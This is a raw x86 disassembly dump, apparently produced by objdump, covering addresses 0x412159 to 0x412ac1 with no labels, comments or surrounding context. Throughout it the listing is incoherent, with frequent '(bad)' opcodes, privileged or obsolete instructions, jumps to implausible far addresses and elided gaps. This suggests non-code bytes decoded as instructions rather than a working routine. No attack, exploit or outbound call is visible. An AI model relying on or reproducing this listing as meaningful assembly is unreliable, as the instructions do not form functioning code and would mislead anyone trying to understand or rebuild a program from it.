  412159:	mov    ds:0x16bce923,eax
  41215e:	test   BYTE PTR [edx-0x17],al
  412161:	pop    ss
  412162:	mov    esp,DWORD PTR [esi+ebp*4]
  412165:	dec    ebp
  412166:	mov    WORD PTR [edx+0x3d],?
  412169:	add    BYTE PTR [eax],al
  41216b:	add    BYTE PTR [eax],ah
  41216d:	sbb    BYTE PTR ss:[esi+ebx*1+0x45],dh
  412172:	inc    eax
  412173:	test   DWORD PTR [ecx+0x71],ebx
  412176:	hlt    
  412177:	and    DWORD PTR [eax],0x3
  41217a:	test   ecx,ecx
  41217c:	lea    eax,[ebx+eax*4]
  41217f:	rcl    dl,0xe6
  412182:	add    DWORD PTR [ebx+0x46470290],eax
  412188:	arpl   WORD PTR [edi+0x22],bx
  41218b:	sbb    al,0xe1
  41218d:	jo     0x41215b
  41218f:	pop    edi
  412190:	es pop ecx
  412192:	pop    ecx
  412193:	ret    0x3d4
  412196:	mov    edx,DWORD PTR [esp+edi*1+0x0]
  41219a:	push   ebp
  41219b:	push   esi
  41219c:	sub    ebp,esp
  41219e:	lds    eax,FWORD PTR [esi-0x1c878]
  4121a4:	nop
  4121a5:	add    eax,DWORD PTR [eax]
  4121a7:	add    BYTE PTR [edx],bl
  4121a9:	add    eax,0xb787c984
  4121ae:	add    DWORD PTR cs:[eax],eax
	...
  4121c1:	add    BYTE PTR [eax],al
  4121c3:	add    BYTE PTR [eax-0x7b74a8fd],dl
  4121c9:	push   edi
  4121ca:	adc    al,BYTE PTR [ebx+0x57609e7]
  4121d0:	xchg   edi,eax
  4121d1:	or     al,BYTE PTR [eax]
  4121d3:	add    BYTE PTR [eax-0x7a],dl
  4121d6:	shr    BYTE PTR [ebx],0xf
  4121d9:	xchg   ebx,eax
  4121da:	cmp    BYTE PTR [eax],cl
  4121dc:	ins    BYTE PTR es:[edi],dx
  4121dd:	inc    ebp
  4121de:	dec    ebp
  4121df:	inc    eax
  4121e0:	(bad)  
  4121e2:	jae    0x4121da
  4121e4:	rol    DWORD PTR [eax+0x350041a],cl
  4121ea:	push   DWORD PTR [ebp+0x5]
  4121ed:	xchg   BYTE PTR [eax+edx*1-0x76fffce4],al
  4121f4:	sahf   
  4121f5:	sbb    eax,DWORD PTR [eax+eax*1]
  4121f8:	cmp    DWORD PTR [ecx],ebp
  4121fa:	ret    0xbfc6
  4121fd:	and    al,0xfe
  4121ff:	dec    DWORD PTR [esi]
  412201:	xor    DWORD PTR [edx],eax
  412203:	add    BYTE PTR [ecx],bh
  412205:	mov    al,0x80
  412207:	sysexit 
  412209:	sub    DWORD PTR [edx],eax
  41220b:	mov    edi,DWORD PTR [edi-0x110001b0]
  412211:	js     0x4121f6
  412213:	mov    bh,BYTE PTR [edi-0x210001c8]
  412219:	mov    ds:0x20c15f0d,al
  41221e:	aaa    
  41221f:	test   DWORD PTR [ecx],ebp
  412221:	and    eax,0x14670002
  412226:	inc    esi
  412227:	pop    es
	...
  41223c:	cmp    DWORD PTR [eax+edi*1+0x4aa9f173],esp
  412243:	(bad)  
  412244:	cmp    BYTE PTR [edi+0x29390417],ch
  41224a:	test   DWORD PTR [eax+0x30],ebp
  41224d:	adc    al,0x1b
  41224f:	mov    edi,DWORD PTR [edi-0x710001c8]
  412255:	scas   eax,DWORD PTR es:[edi]
  412256:	adc    DWORD PTR [edi],0x4002293d
  41225c:	mov    al,0xbe
  41225e:	pop    ss
  41225f:	add    al,0x39
  412261:	sub    DWORD PTR [ecx+0x2254985],ecx
  412267:	add    BYTE PTR [edx+0x39041b9e],dh
  41226d:	sub    DWORD PTR [edi+ecx*1-0x3ec604c5],ecx
  412274:	rcr    DWORD PTR [eax+0x1],0x8e
  412278:	and    eax,0xc400021d
  41227d:	dec    edi
  41227e:	mov    eax,DWORD PTR [ebp+0x21b49]
  412284:	rol    BYTE PTR [eax],0x6f
  412287:	sbb    al,0x3d
  412289:	add    cl,ch
  41228b:	ret    
  41228c:	mov    cl,0x66
  41228e:	hlt    
  41228f:	call   DWORD PTR [esi]
  412291:	ss pop edi
  412293:	cmp    BYTE PTR [esi],0xfc
  412296:	call   0xe0bfd49e
  41229b:	(bad)  
  41229c:	(bad)  
  41229d:	xor    eax,0x1462
	...
  4122b2:	add    BYTE PTR [eax],al
  4122b4:	cmp    edx,DWORD PTR [edx-0x12]
  4122b7:	inc    ebp
  4122b8:	mov    dh,0x10
  4122ba:	call   0xe93d6548
  4122bf:	add    esp,DWORD PTR [edi+edx*1+0x62]
  4122c3:	add    DWORD PTR [esi-0x4],0x7ec003e8
  4122ca:	loopne 0x4122cb
  4122cc:	(bad)  
  4122cd:	xor    eax,0x148c8b28
  4122d2:	in     eax,dx
  4122d3:	add    edi,DWORD PTR [ecx]
  4122d5:	xchg   DWORD PTR [esi+0x13],esp
  4122d8:	xor    eax,0xbc8ce900
  4122dd:	sbb    ch,ah
  4122df:	add    edi,DWORD PTR [ecx]
  4122e1:	mov    ah,al
  4122e3:	add    eax,0x8ca73680
  4122e8:	addr16 loope 0x412286
  4122eb:	mov    edi,DWORD PTR [esi]
  4122ed:	shl    BYTE PTR [ecx+0x49],cl
  4122f0:	xchg   esi,eax
  4122f1:	push   edi
  4122f2:	je     0x41232c
  4122f4:	ja     0x41227f
  4122f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122f7:	test   BYTE PTR [esi+0x748cb8fc],cl
  4122fd:	sub    BYTE PTR [edi+esi*1],ch
  412300:	pop    edi
  412301:	xor    eax,0x1fbb4861
  412306:	jmp    0x4278:0x5046c3d2
  41230d:	xor    eax,0xff57843d
  412312:	call   FWORD PTR [ebp+0x75e742c5]
	...
  41232c:	data16 ss inc dh
  412330:	add    ah,dl
  412332:	shl    ecx,0x3a
  412335:	or     eax,0x1b863b16
  41233b:	in     eax,0x3a
  41233d:	add    BYTE PTR [ebp+0x18ab3390],cl
  412343:	jb     0x4122fd
  412345:	add    al,0x4
  412347:	jmp    0xd1c6aa86
  41234c:	out    dx,al
  41234d:	xor    al,0xfe
  41234f:	sub    DWORD PTR [edx+eiz*2+0x3ae51b],esi
  412356:	mov    DWORD PTR [edi+0x2d],ebp
  412359:	cld    
  41235a:	(bad)  
  41235b:	call   0xed589e23
  412360:	cmp    al,BYTE PTR [eax]
  412362:	mov    bl,cl
  412364:	cmp    BYTE PTR [edx-0x3],dl
  412367:	stos   DWORD PTR es:[edi],eax
  412368:	lds    eax,FWORD PTR [ecx+eax*1]
  41236b:	pop    edi
  41236c:	push   ecx
  41236d:	cld    
  41236e:	(bad)  
  41236f:	call   0x67cc3b5d
  412374:	inc    ebp
  412375:	cld    
  412376:	(bad)  
  412377:	call   0xe5589e41
  41237c:	cmp    al,BYTE PTR [eax]
  41237e:	inc    eax
  41237f:	jo     0x4123a0
  412381:	sbb    DWORD PTR [ecx+ebp*8],eax
  412384:	cmp    al,BYTE PTR [edi+0x3476d985]
  41238a:	(bad)  
  41238b:	(bad)  
  41238c:	out    dx,eax
  41238d:	or     al,0x4
  41238f:	jmp    0x412394
	...
  4123a4:	cmp    cl,BYTE PTR [edx+0x3308eb0f]
  4123aa:	shl    DWORD PTR [ecx+0x2d],0xff
  4123ae:	(bad)  
  4123af:	in     eax,dx
  4123b0:	dec    esi
  4123b1:	xor    al,0xfe
  4123b3:	add    BYTE PTR [ebp+0x60868b13],al
  4123b9:	xor    al,0xfe
  4123bb:	call   FWORD PTR [ecx+0x200416b2]
  4123c1:	add    BYTE PTR [eax-0x77],al
  4123c4:	mov    ds,WORD PTR [eax]
  4123c6:	add    al,0x0
  4123c8:	adc    BYTE PTR [ebp+0x241084],al
  4123ce:	add    BYTE PTR [ebx+0x41496],cl
  4123d4:	adc    BYTE PTR [edx-0x15ddfdf2],cl
  4123da:	ror    BYTE PTR [eax+0x1c8dfd10],0xd4
  4123e1:	(bad)  
  4123e2:	push   DWORD PTR [ecx+edi*1-0x79]
  4123e6:	test   BYTE PTR [eax],dl
  4123e8:	aam    0xff
  4123ea:	dec    DWORD PTR [eax+0x41766]
  4123f0:	loopne 0x412431
  4123f2:	xchg   DWORD PTR [esi-0x1cc24],ebp
  4123f8:	dec    ecx
  4123f9:	mov    ch,0xe
  4123fb:	add    al,0xa0
  4123fd:	dec    DWORD PTR [edx-0x1cc777a]
  412403:	jmp    eax
  412405:	pop    ds
  412406:	dec    DWORD PTR [ebp+0x0]
	...
  41241c:	pushf  
  41241d:	xor    edi,esi
  41241f:	push   DWORD PTR ds:0x90868b15
  412425:	xor    edi,esi
  412427:	dec    DWORD PTR [ecx]
  412429:	mov    ch,0x16
  41242b:	add    al,0x90
  41242d:	(bad)  
  41242e:	aas    
  41242f:	mov    esi,edi
  412431:	or     al,BYTE PTR [eax+eax*1]
  412434:	pusha  
  412435:	test   BYTE PTR [eax+edx*1-0x750000ac],al
  41243c:	(bad)  
  41243d:	push   ss
  41243e:	add    al,0x0
  412440:	cmp    DWORD PTR [ecx],ebp
  412442:	push   edx
  412443:	pop    ds
  412444:	cmp    bl,dl
  412446:	push   ss
  412447:	add    al,0x39
  412449:	sub    DWORD PTR [edi+0x129bb218],ebp
  41244f:	add    al,0x39
  412451:	sub    DWORD PTR [ebx+0x21d5185],ecx
  412457:	add    BYTE PTR [ecx-0x50],bh
  41245a:	sbb    esi,DWORD PTR fs:0xbf890229
  412461:	cmp    dh,bh
  412463:	dec    DWORD PTR [esi]
  412465:	sahf   
  412466:	jl     0x41247f
  412468:	cmp    eax,0x59d00229
  41246d:	sub    BYTE PTR [ebx+ebx*1+0x7502293d],al
  412474:	push   eax
  412475:	sahf   
  412476:	jl     0x412487
  412478:	cmp    eax,0xb7890229
	...
  412491:	add    BYTE PTR [eax],al
  412493:	add    BYTE PTR [ecx],bh
  412495:	jmp    0x1d6ed224
  41249a:	add    al,BYTE PTR [eax]
  41249c:	mov    al,0xa2
  41249e:	adc    eax,DWORD PTR [ecx+edi*1]
  4124a1:	sub    DWORD PTR [edi+0x22551b5],eax
  4124a7:	add    BYTE PTR [ecx+0x7b5cd5fa],cl
  4124ad:	xor    BYTE PTR [edx],al
  4124af:	mov    esi,ebp
  4124b1:	cmp    al,0xfe
  4124b3:	push   ebp
  4124b4:	out    dx,al
  4124b5:	popf   
  4124b6:	mov    bh,0x23
  4124b8:	sub    DWORD PTR [esi+0x28b93c32],ebx
  4124be:	add    al,BYTE PTR [eax]
  4124c0:	or     dl,BYTE PTR [ebp+0x7f]
  4124c3:	(bad)  
  4124c4:	cmp    eax,0xb73b0b36
  4124c9:	cmp    al,0xfe
  4124cb:	jmp    DWORD PTR [esi-0x1]
  4124ce:	fmul   st(7),st
  4124d0:	addr16 push edi
  4124d2:	add    DWORD PTR [ebx+edi*4+0x1f],eax
  4124d6:	out    dx,al
  4124d7:	aam    0xbb
  4124d9:	aas    
  4124da:	jecxz  0x4124b1
  4124dc:	js     0x4124e5
  4124de:	jmp    0xe51cd9db
  4124e3:	add    edi,DWORD PTR [ecx]
  4124e5:	lods   al,BYTE PTR ds:[esi]
  4124e6:	repz imul BYTE PTR [esi-0x55fc1700]
  4124ed:	sti    
  4124ee:	imul   esp,DWORD PTR ds:0xf6f82538,0x3e8fd16
	...
  41250c:	mov    edi,edi
  41250e:	popf   
  41250f:	test   BYTE PTR [esi],0xb5
  412512:	call   0xae40b01a
  412517:	inc    edx
  412518:	fimul  WORD PTR [eax]
  41251a:	call   0x1c2b:0x98fdae80
  412521:	ss in  eax,0x34
  412524:	xchg   DWORD PTR [ebp+0x28ee88ae],eax
  41252a:	hlt    
  41252b:	cmp    edi,ecx
  41252d:	xor    DWORD PTR [ebx-0x41],ebx
  412530:	cs push es
  412532:	and    dl,ch
  412534:	pop    esp
  412535:	lock add ecx,DWORD PTR ds:[esi]
  412539:	sub    ah,ah
  41253b:	cmp    DWORD PTR [edi-0x197ef2cf],ebp
  412541:	cld    
  412542:	inc    esi
  412543:	inc    edx
  412544:	add    BYTE PTR ss:[edx],bh
  412547:	mov    edx,esi
  412549:	fneni(8087 only) 
  41254b:	into   
  41254c:	in     al,0x84
  41254e:	xchg   edi,eax
  41254f:	add    ah,0xe8
  412552:	in     al,dx
  412553:	add    edi,DWORD PTR [ecx]
  412555:	add    BYTE PTR [esi],dl
  412557:	add    eax,0xe80015bd
  41255c:	cmp    al,BYTE PTR [eax]
  41255e:	xor    DWORD PTR [edx-0x46],0xa9e9fe31
  412565:	rol    BYTE PTR [edx+0x40976dd],0xda
  41256c:	push   eax
  41256d:	sbb    DWORD PTR [esi],esi
  41256f:	push   edx
	...
  412584:	or     eax,0x12378a32
  412589:	loope  0x412585
  41258b:	ds ins DWORD PTR es:[edi],dx
  41258d:	xchg   ch,cl
  41258f:	inc    ecx
  412590:	jo     0x4125c9
  412592:	(bad)  
  412593:	cs mov al,0xbc
  412596:	and    eax,DWORD PTR [ecx]
  412598:	mov    al,0x8a
  41259a:	pmulhw mm7,QWORD PTR [edx]
  41259d:	add    BYTE PTR [edx+0x1ffee22],cl
  4125a3:	and    BYTE PTR [eax],bh
  4125a5:	aas    
  4125a6:	pop    esi
  4125a7:	jno    0x4125e1
  4125a9:	xor    DWORD PTR [ebp-0x1cf0927],eax
  4125af:	pusha  
  4125b0:	(bad)  
  4125b1:	fadd   QWORD PTR [ebx]
  4125b3:	jmp    0x429df7f2
  4125b8:	ja     0x4125b3
  4125ba:	jmp    FWORD PTR [ecx+0x7a]
  4125bd:	xor    al,BYTE PTR [eax]
  4125bf:	xchg   edi,eax
  4125c0:	sub    esp,edi
  4125c2:	(bad)  
  4125c3:	call   0x3c49c781
  4125c8:	sub    al,0x85
  4125ca:	test   ecx,ebx
  4125cc:	add    BYTE PTR ds:[eax],al
  4125cf:	pusha  
  4125d0:	ret    
  4125d1:	or     BYTE PTR [ecx+ebp*8],al
  4125d4:	cmp    al,al
  4125d6:	mov    BYTE PTR [edi+0x49],dl
  4125d9:	cld    
  4125da:	(bad)  
  4125db:	call   0xed50a0f5
  4125e0:	cmp    al,BYTE PTR [eax]
  4125e2:	mov    esp,DWORD PTR [edi+0x35]
  4125e5:	cld    
  4125e6:	(bad)  
  4125e7:	inc    DWORD PTR [eax]
	...
  4125f9:	add    BYTE PTR [eax],al
  4125fb:	add    BYTE PTR [eax-0x56fdf94e],dl
  412601:	in     eax,dx
  412602:	mov    edi,0xbdfb5888
  412607:	sbb    al,0x5c
  412609:	cld    
  41260a:	push   DWORD PTR [ecx+edi*1-0x4f]
  41260e:	test   BYTE PTR [eax],dl
  412610:	pop    esp
  412611:	cld    
  412612:	dec    DWORD PTR [eax+0x403de]
  412618:	push   eax
  412619:	cmp    al,0x87
  41261b:	scas   al,BYTE PTR es:[edi]
  41261c:	push   esp
  41261d:	clc    
  41261e:	(bad)  
  41261f:	jmp    FWORD PTR [ecx+0x20040e7a]
  412625:	add    al,0x8b
  412627:	xchg   BYTE PTR [eax],cl
  412629:	or     BYTE PTR [eax],al
  41262b:	add    BYTE PTR [eax+0x24],ah
  41262e:	mov    ebx,edx
  412630:	popa   
  412631:	push   cs
  412632:	pop    es
  412633:	and    DWORD PTR [edx+0x6],0x52
  412637:	mov    esp,DWORD PTR [esi]
  412639:	or     al,0xc8
  41263b:	cli    
  41263c:	aaa    
  41263d:	xrelease mov DWORD PTR [esi+0x810],eax
  412644:	pop    eax
  412645:	cld    
  412646:	mov    bh,0x1
  412648:	rol    BYTE PTR [ebx],1
  41264a:	add    BYTE PTR [ecx],al
  41264c:	dec    esi
  41264d:	adc    eax,DWORD PTR [eax+eax*1]
  412650:	loopne 0x4125fe
  412652:	pushf  
  412653:	and    al,0xdc
  412655:	add    eax,DWORD PTR [eax]
  412657:	sub    ebx,0xd0fffe83
  41265d:	jbe    0x412675
  41265f:	add    DWORD PTR [eax],0x0
	...
  412672:	add    BYTE PTR [eax],al
  412674:	add    al,0x18
  412676:	push   ss
  412677:	add    bl,BYTE PTR [ebx]
  412679:	outs   dx,DWORD PTR ds:[esi]
  41267a:	and    bl,BYTE PTR [eax]
  41267c:	inc    ecx
  41267d:	scas   eax,DWORD PTR es:[edi]
  41267e:	int3   
  41267f:	call   0x3f03a3
  412684:	push   edi
  412685:	push   edx
  412686:	pop    ebx
  412687:	pop    ebx
  412688:	cmp    DWORD PTR [ebx-0x6],ebx
  41268b:	(bad)  
  41268c:	mov    ecx,0x39050292
  412691:	sbb    DWORD PTR [ebx+eax*1+0x17e7e520],esi
  412698:	mov    eax,0x397d02b2
  41269d:	sbb    DWORD PTR [ebx+eax*1+0x17e65d10],esi
  4126a4:	ret    0xe65d
  4126a7:	pop    ss
  4126a8:	call   0xd628674e
  4126ad:	shl    BYTE PTR [ecx],cl
  4126af:	(bad)  
  4126b0:	fisub  WORD PTR [esi-0x31]
  4126b3:	pop    edx
  4126b4:	sti    
  4126b5:	xor    BYTE PTR [edx],al
  4126b7:	(bad)  
  4126b8:	mov    bh,0x0
  4126ba:	or     BYTE PTR [eax],al
  4126bc:	cmp    DWORD PTR [eax],ebx
  4126be:	add    al,BYTE PTR [eax]
  4126c0:	cmp    DWORD PTR [eax+0x19397f2d],ebx
  4126c6:	add    dh,BYTE PTR [ebx-0x80]
  4126c9:	call   0x41b5:0x252123ae
  4126d0:	inc    edx
  4126d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d2:	out    0x3,al
  4126d4:	cmp    DWORD PTR [ecx],ebx
  4126d6:	mov    dh,0x39
	...
  4126ec:	loope  0x412710
  4126ee:	sub    al,0xfe
  4126f0:	out    0xa1,al
  4126f2:	inc    eax
  4126f3:	out    0x3a,eax
  4126f5:	and    esi,DWORD PTR [eax]
  4126f7:	inc    dl
  4126f9:	pop    esi
  4126fa:	sbb    ecx,esp
  4126fc:	rcl    BYTE PTR [ebp+0x30],1
  4126ff:	mov    DWORD PTR [ebp+0x5],edi
  412702:	or     al,0x8b
  412704:	scas   eax,DWORD PTR es:[edi]
  412705:	dec    eax
  412706:	push   es
  412707:	add    BYTE PTR [ecx],bh
  412709:	mov    bl,0x54
  41270b:	and    edi,DWORD PTR [eax]
  41270d:	sbb    edx,DWORD PTR [ecx+eax*1+0x7b]
  412711:	std    
  412712:	jnp    0x412714
  412714:	sahf   
  412715:	jmp    FWORD PTR [esi+0x14]
  412718:	cmp    eax,0xac7ae900
  41271d:	jecxz  0x41270b
  41271f:	add    edi,DWORD PTR [ecx]
  412721:	into   
  412722:	sub    ecx,ebp
  412724:	js     0x41271d
  412726:	call   0xe76faeaf
  41272b:	jno    0x41277f
  41272d:	add    al,0xe9
  41272f:	add    esi,DWORD PTR [esi+ebx*4+0x7b41b6df]
  412736:	outs   dx,BYTE PTR ds:[esi]
  412737:	adc    al,0x3d
  412739:	add    cl,ch
  41273b:	jp     0x4126f1
  41273d:	pop    es
  41273e:	in     eax,dx
  41273f:	add    edi,DWORD PTR [ecx]
  412741:	rcr    BYTE PTR [edi+0x62],0x22
  412745:	add    al,0xe9
  412747:	add    eax,eax
  412749:	xchg   al,bl
  41274b:	pop    es
  41274c:	cmp    DWORD PTR [eax],eax
  41274e:	bound  ecx,QWORD PTR [edx+0x0]
	...
  412764:	dec    esi
  412765:	add    al,0xe9
  412767:	add    esi,DWORD PTR [ebx+0x1455eb10]
  41276d:	inc    ebx
  41276e:	jo     0x412784
  412770:	cmp    BYTE PTR [esi-0xc],ch
  412773:	pop    es
  412774:	cmp    DWORD PTR [eax],eax
  412776:	xchg   esp,eax
  412777:	or     dh,BYTE PTR [edx+0x3907d886]
  41277d:	add    BYTE PTR [eax-0x76],dh
  412780:	inc    esi
  412781:	add    al,0xe9
  412783:	add    edi,DWORD PTR [ecx+0x77]
  412786:	adc    BYTE PTR ds:0xbc7ae900,dh
  41278d:	adc    ch,ah
  41278f:	add    edi,DWORD PTR [ecx]
  412791:	jns    0x412801
  412793:	or     edi,DWORD PTR ds:0x1e53e900
  412799:	jmp    0x7c0f04
  41279e:	jmp    0xffba505a
  4127a3:	test   eax,0x6a0724fb
  4127a8:	cli    
  4127a9:	add    DWORD PTR [eax-0x6f],edx
  4127ac:	mov    al,0x28
  4127ae:	(bad)  
  4127af:	sahf   
  4127b0:	or     eax,0x3aed0f7b
  4127b5:	add    BYTE PTR [eax+0x12f0],cl
  4127bb:	jmp    0xd9c726fa
  4127c0:	add    BYTE PTR ss:[eax],al
  4127c3:	pusha  
  4127c4:	enter  0x3e1,0xe9
	...
  4127dc:	cmp    bh,BYTE PTR [edi-0x6]
  4127df:	imul   edi,DWORD PTR [edx],0x42da0000
  4127e5:	sub    DWORD PTR [ebx+0xd],0xb58b0235
  4127ec:	push   esi
  4127ed:	adc    eax,0x25787252
  4127f2:	arpl   WORD PTR [eax+0x69],ax
  4127f5:	cs pop esi
  4127f7:	xchg   edi,eax
  4127f8:	test   ecx,0x7f3ae1c1
  4127fe:	cli    
  4127ff:	jmp    0x9b412843
  412804:	xlat   BYTE PTR ss:[ebx]
  412806:	inc    ebx
  412807:	int    0x32
  412809:	jg     0x412805
  41280b:	jmp    0x7c3f54df
  412810:	rcl    edi,cl
  412812:	inc    ebx
  412813:	lds    eax,FWORD PTR [edx+0x79]
  412816:	push   ebx
  412817:	int    0x32
  412819:	ror    BYTE PTR [edx-0x717bde1],cl
  41281f:	out    0x26,al
  412821:	into   
  412822:	pop    ebp
  412823:	cmp    al,0x2
  412825:	aas    
  412826:	pop    es
  412827:	jmp    0xe55c9669
  41282c:	cmp    al,BYTE PTR [eax]
  41282e:	jne    0x412830
  412830:	cdq    
  412831:	test   eax,0x941084
  412836:	add    BYTE PTR [ecx+0x3fc16],cl
  41283c:	nop
  41283d:	inc    eax
  41283e:	xchg   DWORD PTR [esi+0x0],ebp
	...
  412854:	cmp    al,0xf8
  412856:	(bad)  
  412857:	dec    DWORD PTR [ecx]
  412859:	xchg   BYTE PTR [esi],cl
  41285b:	add    al,0x90
  41285d:	add    BYTE PTR [ebx+0x48886],cl
  412863:	add    al,dl
  412865:	and    edi,edi
  412867:	mov    ebp,0x48c
  41286c:	gs sti 
  41286e:	mov    al,BYTE PTR [esi+0x480]
  412874:	leave  
  412875:	test   DWORD PTR [esi],edx
  412877:	add    al,0x60
  412879:	add    BYTE PTR [eax-0x77],al
  41287c:	mov    esi,0x5000040f
  412881:	stos   DWORD PTR es:[edi],eax
  412882:	test   BYTE PTR [eax],dl
  412884:	and    al,0x0
  412886:	add    BYTE PTR [ebx+0x3fc96],cl
  41288c:	adc    al,dl
  41288e:	push   ds
  41288f:	mov    eax,esp
  412891:	and    edx,DWORD PTR [esi]
  412893:	push   edx
  412894:	mov    ebp,edx
  412896:	out    0xd4,al
  412898:	pop    eax
  412899:	(bad)  
  41289b:	pop    edi
  41289c:	into   
  41289d:	push   eax
  41289e:	pop    ecx
  41289f:	ret    0x18
  4128a2:	mov    eax,DWORD PTR [esp+eax*1+0x4]
  4128a6:	lea    edx,[eax-0x7820]
  4128ac:	stos   DWORD PTR es:[edi],eax
  4128ad:	xchg   esp,eax
  4128ae:	add    al,BYTE PTR [eax+edx*8]
  4128b1:	push   DWORD PTR [ebp+0x19]
  4128b4:	dec    ebx
  4128b5:	lods   al,BYTE PTR ds:[esi]
  4128b6:	or     al,BYTE PTR [eax+eax*1]
	...
  4128c9:	add    BYTE PTR [eax],al
  4128cb:	add    al,ah
  4128cd:	(bad)  
  4128ce:	cmp    al,cl
  4128d0:	cmp    ebx,ecx
  4128d2:	or     BYTE PTR [ebx],ch
  4128d4:	clc    
  4128d5:	push   edi
  4128d6:	push   es
  4128d7:	add    BYTE PTR [edx+0x58],ah
  4128da:	pop    es
  4128db:	add    BYTE PTR [ecx],ah
  4128dd:	sbb    BYTE PTR [edx],al
  4128df:	ret    0x193d
  4128e2:	icebp  
  4128e3:	mov    edi,0x8302257b
  4128e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e9:	sub    ecx,edx
  4128eb:	push   esp
  4128ec:	ret    0xe7fd
  4128ef:	pop    ds
  4128f0:	out    dx,eax
  4128f1:	inc    ebp
  4128f2:	dec    ecx
  4128f3:	mov    cl,BYTE PTR [eax+0x1d5b7cf2]
  4128f9:	dec    ecx
  4128fa:	jnp    0x412957
  4128fc:	adc    eax,0x31adeb21
  412901:	sbb    eax,0x962e0002
  412906:	popa   
  412907:	call   DWORD PTR [esi+0x19]
  41290a:	sbb    DWORD PTR [edx],ecx
  41290c:	mov    esp,0x46ffe685
  412911:	sbb    DWORD PTR [edx],eax
  412913:	(bad)  
  412914:	aad    0x4
  412916:	add    al,0x8b
  412918:	mov    edi,0x3900061c
  41291d:	pushf  
  41291e:	jp     0x41291f
  412920:	sahf   
  412921:	sbb    BYTE PTR [edx],al
  412923:	cmp    esi,ecx
  412925:	jb     0x41293c
  412927:	mov    eax,edi
  412929:	xor    al,0x6
  41292b:	add    BYTE PTR [ecx],bh
  41292d:	push   ds
  41292e:	inc    ebx
  41292f:	jne    0x412931
	...
  412941:	add    BYTE PTR [eax],al
  412943:	add    BYTE PTR ds:0x32ea433e,bh
  412949:	ds inc ebx
  41294b:	add    al,0x39
  41294d:	xchg   ecx,eax
  41294e:	add    eax,DWORD PTR [eax]
  412950:	loop   0x412968
  412952:	icebp  
  412953:	mov    edi,0x3faa2b2
  412958:	cmp    DWORD PTR [ecx],ebx
  41295a:	std    
  41295b:	mov    ch,0x28
  41295d:	add    dh,dh
  41295f:	jne    0x4128e2
  412961:	add    DWORD PTR [edx-0x28],esi
  412964:	lods   al,BYTE PTR ds:[esi]
  412965:	add    esp,DWORD PTR [edx+0x0]
  412968:	mov    bl,0x76
  41296a:	push   cs
  41296b:	jnp    0x4129af
  41296d:	xor    DWORD PTR [ecx-0x7a],0x36
  412971:	add    al,0xe9
  412973:	add    esi,DWORD PTR [esi]
  412975:	jb     0x41294f
  412977:	cld    
  412978:	in     al,0xbf
  41297a:	out    0x78,eax
  41297c:	add    dl,BYTE PTR [edx+0x3a478ec]
  412982:	in     eax,0x3
  412984:	cmp    DWORD PTR [ecx-0x4],edi
  412987:	add    cl,0x0
  41298a:	jmp    0x77426292
  41298f:	or     BYTE PTR ds:0xb702e900,dh
  412995:	imul   esp
  412997:	add    edi,DWORD PTR [ecx]
  412999:	ja     0x412a01
  41299b:	or     BYTE PTR ds:0x7678e900,bh
  4129a1:	(bad)  
  4129a2:	outs   dx,BYTE PTR ds:[esi]
  4129a3:	add    BYTE PTR ds:0x82e900,bh
	...
  4129b9:	add    BYTE PTR [eax],al
  4129bb:	add    BYTE PTR [ecx-0x1],al
  4129be:	rol    BYTE PTR [edx],0x39
  4129c1:	mov    dl,0xed
  4129c3:	mov    ebx,0x7ec82c1
  4129c8:	cmp    DWORD PTR [eax],eax
  4129ca:	lock pop ebp
  4129cc:	ss add al,0xe9
  4129cf:	add    eax,DWORD PTR [esi+0x7e]
  4129d2:	xchg   edx,eax
  4129d3:	sub    al,0xf
  4129d5:	sub    dh,BYTE PTR [ecx-0x38]
  4129d8:	pop    edx
  4129d9:	lock push edx
  4129db:	add    al,0x96
  4129dd:	(bad)  
  4129de:	call   0xeef422cb
  4129e3:	jp     0x41296f
  4129e5:	in     al,0xb8
  4129e7:	sbb    BYTE PTR [ecx],dh
  4129e9:	jge    0x4129ea
  4129eb:	lock cmp edi,ecx
  4129ee:	test   DWORD PTR [ebx],esp
  4129f0:	cmp    al,BYTE PTR [eax]
  4129f2:	add    dh,dh
  4129f4:	inc    esp
  4129f5:	(bad)  
  4129f6:	(bad)  
  4129f7:	in     eax,dx
  4129f8:	dec    esp
  4129f9:	mov    esp,0x83f66200
  4129fe:	add    esp,DWORD PTR [edx-0x5a]
  412a01:	cmp    DWORD PTR [edx],0xb27dadc2
  412a07:	call   0x67cc2a46
  412a0c:	call   0xefd:0x17e8fffd
  412a13:	scas   al,BYTE PTR es:[edi]
  412a14:	jbe    0x4129f3
  412a16:	sbb    ebp,ecx
  412a18:	sub    BYTE PTR [ecx],0xfe
  412a1b:	shl    bh,cl
  412a1d:	scas   al,BYTE PTR es:[edi]
  412a1e:	cmp    DWORD PTR [edx+0x0],esp
	...
  412a31:	add    BYTE PTR [eax],al
  412a33:	add    BYTE PTR ds:0x66fdfae6,ah
  412a39:	jl     0x4129c1
  412a3b:	jmp    0xb2412b02
  412a40:	mov    ah,0xfd
  412a42:	add    ebp,ecx
  412a44:	cmp    dh,BYTE PTR [edx-0xa4b8de9]
  412a4a:	add    ebp,ecx
  412a4c:	cmp    ah,ch
  412a4e:	neg    edi
  412a50:	ss aad 0xf7
  412a53:	inc    edx
  412a54:	ss (bad) 
  412a56:	imul   DWORD PTR [eax+0x75]
  412a59:	sub    DWORD PTR [esi-0x18],esp
  412a5c:	cmp    dl,BYTE PTR ds:0x764dfa01
  412a62:	add    eax,0x8c712662
  412a67:	in     eax,dx
  412a68:	or     eax,0x429ac4e6
  412a6d:	call   0xb31ff7c5
  412a72:	add    esp,DWORD PTR [eax+0xe]
  412a75:	(bad)  [ebx]
  412a77:	add    bl,bh
  412a79:	xlat   BYTE PTR ds:[ebx]
  412a7a:	or     eax,0xfffdc284
  412a7f:	call   DWORD PTR [ebp+0x78]
  412a82:	(bad)  
  412a83:	jmp    eax
  412a85:	cld    
  412a86:	mov    cl,ch
  412a88:	sub    ebp,esp
  412a8a:	xchg   DWORD PTR [esp+edi*1+0x10],ecx
  412a8e:	cmp    ecx,DWORD PTR [esp+ebp*1+0x48]
  412a92:	or     eax,0x34a87
	...
  412aab:	add    BYTE PTR [ebx],ch
  412aad:	push   0x102a1022
  412ab2:	add    DWORD PTR [edx],edi
  412ab4:	cmp    al,0x27
  412ab6:	dec    BYTE PTR [edx-0x44eddfcc]
  412abc:	mov    ds:0x2cfffffc,al
  412ac1:	sub    BYTE PTR [ecx],bh
